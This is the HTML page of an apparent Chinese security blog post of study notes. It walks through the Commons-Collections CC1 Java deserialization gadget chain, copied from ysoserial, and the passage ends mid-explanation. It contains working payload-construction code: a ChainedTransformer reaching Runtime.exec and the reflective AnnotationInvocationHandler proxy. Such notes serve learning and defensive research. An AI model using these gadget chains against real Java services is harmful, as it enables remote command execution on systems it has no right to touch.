@@ -1,0 +1,1112 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Common-Collections系列payload复现问就是太菜了，什么都不会，所以需要加强记忆，保姆级复习代码基本上都是抄的yso，但是要手跟一下总结一下 CC1最古老的payload，在极低版本的jdk上生效，因为已经修掉了所以现在基本上没有用，在这里可以下载远古jdk，这里用的1.8u51，非常远古https:&#x2F;&#x2F;www.oracle.com&#x2F;java&#x2F;technologies&#x2F;java">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Common-Collections系列payload复现">
+<meta property="og:url" content="https://blog.z3ratu1.cn/Common-Collections%E7%B3%BB%E5%88%97payload%E5%A4%8D%E7%8E%B0.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="Common-Collections系列payload复现问就是太菜了，什么都不会，所以需要加强记忆，保姆级复习代码基本上都是抄的yso，但是要手跟一下总结一下 CC1最古老的payload，在极低版本的jdk上生效，因为已经修掉了所以现在基本上没有用，在这里可以下载远古jdk，这里用的1.8u51，非常远古https:&#x2F;&#x2F;www.oracle.com&#x2F;java&#x2F;technologies&#x2F;java">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-10-12T11:26:40.000Z">
+<meta property="article:modified_time" content="2021-10-15T14:09:43.410Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/Common-Collections%E7%B3%BB%E5%88%97payload%E5%A4%8D%E7%8E%B0.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>Common-Collections系列payload复现 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/Common-Collections%E7%B3%BB%E5%88%97payload%E5%A4%8D%E7%8E%B0.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Common-Collections系列payload复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-10-12 19:26:40" itemprop="dateCreated datePublished" datetime="2021-10-12T19:26:40+08:00">2021-10-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-15 22:09:43" itemprop="dateModified" datetime="2021-10-15T22:09:43+08:00">2021-10-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/Common-Collections%E7%B3%BB%E5%88%97payload%E5%A4%8D%E7%8E%B0.html" class="post-meta-item leancloud_visitors" data-flag-title="Common-Collections系列payload复现" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/Common-Collections%E7%B3%BB%E5%88%97payload%E5%A4%8D%E7%8E%B0.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/Common-Collections%E7%B3%BB%E5%88%97payload%E5%A4%8D%E7%8E%B0.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Common-Collections系列payload复现"><a href="#Common-Collections系列payload复现" class="headerlink" title="Common-Collections系列payload复现"></a>Common-Collections系列payload复现</h1><p>问就是太菜了，什么都不会，所以需要加强记忆，保姆级复习<br>代码基本上都是抄的yso，但是要手跟一下总结一下</p>
+<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><p>最古老的payload，在极低版本的jdk上生效，因为已经修掉了所以现在基本上没有用，在这里可以下载远古jdk，这里用的1.8u51，非常远古<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
+<h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><pre><code>Gadget chain:
+    ObjectInputStream.readObject()
+        AnnotationInvocationHandler.readObject()
+            Map(Proxy).entrySet()
+                AnnotationInvocationHandler.invoke()
+                    LazyMap.get()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.getRuntime()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.exec()
+</code></pre>
+<h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer[]"></a>Transformer[]</h3><p>先看Transformer数组这一套，这个是后续利用的常客，Transformer是一个基类，其下拥有ChainedTransformer，ConstantTransformer，InvokerTransformer众多子类，其拥有一个transform方法，ChainedTransformer的该方法如下(ChainedTransformer有一个成员变量数组iTransformer)</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> iTransformers<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            object <span class="token operator">=</span> iTransformers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>就是以上一次transform的结果为参数，依次调用自己的各transformer的transform方法。<br>ConstantTransformer从名字上就能听出来，其transform方法返回一个常量，可在构造函数中传入该常量<br>InvokerTransformer的该方法比较牛逼，其在构造时可以传入需要调用的方法名iMethod和参数列表iParamTypes，直接进行反射调用</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            Class <span class="token class-name">cls</span> <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Method method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>iMethodName<span class="token punctuation">,</span> iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                
+        <span class="token punctuation">}</span>
+        <span class="token keyword">catch</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>因此写出Transformer的部分代码</p>
+<pre class=" language-java"><code class="language-java">        <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>command<span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> Transformer transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>调用ChainedTransformer的transform方法，就先通过ConstantTransformer返回<code>Runtime.class</code>，然后利用invokeTransformer调用方法，先调用getMethod方法，获取到Runtime类的getRuntime Method，之后对使用invoke调用Method对象，返回Runtime类实例，最终调用Runtime对象的exec方法进行命令执行。<br>也就等价于<code>Runtime.getRutime.exec(args)</code>。</p>
+<h3 id="从AnnotationInvocationHandler-invoke到LazyMap-get"><a href="#从AnnotationInvocationHandler-invoke到LazyMap-get" class="headerlink" title="从AnnotationInvocationHandler.invoke到LazyMap.get"></a>从AnnotationInvocationHandler.invoke到LazyMap.get</h3><p>那么接下来的任务就是找到一个触发ChainedTransformer的transform方法的点了，这里看到LazyMap的get方法</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Object <span class="token function">get</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// create value for key if key is not currently in the map</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            Object value <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> value<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>如果key不在map中的话，就调用factory属性的transform方法，OK<br>再找一个可以触发LazyMap的get方法的点，按照调用链层层往上，看到AnnotationInvocationHandler.invoke()</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">invoke</span><span class="token punctuation">(</span>Object var1<span class="token punctuation">,</span> Method var2<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> var3<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        String var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Class<span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"equals"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> var5<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> var5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">equalsImpl</span><span class="token punctuation">(</span>var3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var5<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">AssertionError</span><span class="token punctuation">(</span><span class="token string">"Too many parameters for an annotation method"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">byte</span> var7 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+            <span class="token keyword">switch</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1776922004</span><span class="token operator">:</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"toString"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    var7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token keyword">case</span> <span class="token number">147696667</span><span class="token operator">:</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    var7 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token keyword">case</span> <span class="token number">1444986633</span><span class="token operator">:</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"annotationType"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    var7 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">switch</span><span class="token punctuation">(</span>var7<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>
+                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toStringImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
+                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hashCodeImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
+                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">;</span>
+            <span class="token keyword">default</span><span class="token operator">:</span>
+                Object var6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>在switch(var7)的default选项中，进行了<code>Object var6 = this.memberValues.get(var4);</code>memberValues当然是一个map，符合条件</p>
+<p>AnnotationInvocationHandler继承自InvocationHandler，而且需要调用其invoke方法，需要使用Proxy来触发这个invoke。</p>
+<p>简单复习一下代理，一个Proxy需要实现一个继承自InvocationHandler的类，以及一个被代理的对象。Handler类定义一个invoke函数，并在实例化时关联该对象，对由该handler创建的proxy对象进行方法调用，即为调用该handler的invoke方法。而一般来说handler的invoke方法一般是对调用的方法进行包装</p>
+<p>使用如下代码创建一个合适的Proxy类</p>
+<pre class=" language-java"><code class="language-java">        <span class="token keyword">final</span> HashMap innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> Map lazyMap <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Constructor constructor <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> InvocationHandler temp <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Override<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> Map mapProxy <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>先构造好对应的LazyMap，由于AnnotationInvocationHandler的构造函数是私有方法，所以要通过反射来进行创建（为什么构造函数是私有方法啊，那这个类正常情况怎么用啊。。。）<br>将创建的handler与LazyMap进行关联，创建出可用的mapProxy对象</p>
+<p>在构建AnnotationInvocationHandler时传入的第一个类是Override.class，是因为其构造函数要求第一个参数是一个注解类，而Override.class是一个自带的注解类</p>
+<p>但同样的，我们还需要一个能调用Map的方法的函数，因为最初的触发点得是readObject，而AnnotationInvocationHandler这个类的readObject刚好就有这个功能</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>ObjectInputStream var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>
